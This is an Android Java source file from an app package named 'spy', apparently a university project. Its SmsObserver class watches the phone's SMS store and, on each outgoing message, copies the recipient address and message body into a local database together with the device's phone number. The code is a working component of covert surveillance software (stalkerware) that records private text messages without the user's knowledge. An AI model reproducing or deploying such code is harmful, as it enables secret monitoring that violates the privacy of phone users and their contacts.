package edu.uj.jkordas.spy.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import edu.uj.jkordas.spy.DAO.SmsDataSource;
import edu.uj.jkordas.spy.developer.Logger;
import edu.uj.jkordas.spy.settings.Preferences;

public class SmsObserver extends ContentObserver {

    private static final String TAG = "SMSTRACKER";
    private static final Uri SMS_URI = Uri.parse("content://sms");

    private Context context;
    private Handler handler;

    private long lastMessageId;

    public SmsObserver(Handler handler, Context context) {
        super(handler);
        this.handler = handler;
        this.context = context;
        this.lastMessageId = -1;
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    @Override
    public void onChange(boolean selfChange) {

        try {
            Log.d(TAG, "Notification on SMS observer");
            Cursor sms_sent_cursor = context.getContentResolver().query(SMS_URI, null, null,
                    null, null);
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    String protocol = sms_sent_cursor.getString(sms_sent_cursor
                            .getColumnIndex("protocol"));
                    Log.d(TAG, "protocol : " + protocol);
                    if (protocol == null) {
                        Cursor cur = context.getContentResolver().query(SMS_URI, null, null,
                                null, null);
                        cur.moveToNext();

                        long currentMessageId = cur.getLong(cur.getColumnIndex("_id"));
                        if (this.lastMessageId != currentMessageId) {

                            String address = cur.getString(cur.getColumnIndex("address"));
                            String body = cur.getString(cur.getColumnIndex("body"));
                            String person = cur.getString(cur.getColumnIndex("person"));
                            @SuppressWarnings("unused")
                            String subject = cur.getString(cur.getColumnIndex("subject"));
                            Logger.log(context, "sent");

                            SmsDataSource datasource = new SmsDataSource(context);
                            datasource.open();

                            datasource.addSMS(Preferences.phoneNumber, address, body);
                            datasource.close();
                        }

                        this.lastMessageId = currentMessageId;
                    }
                }
            } else
                Log.e(TAG, "Send Cursor is Empty");
        } catch (Exception sggh) {
            Log.e(TAG, "Error on onChange : " + sggh.toString());
        }

        super.onChange(selfChange);
    }
}
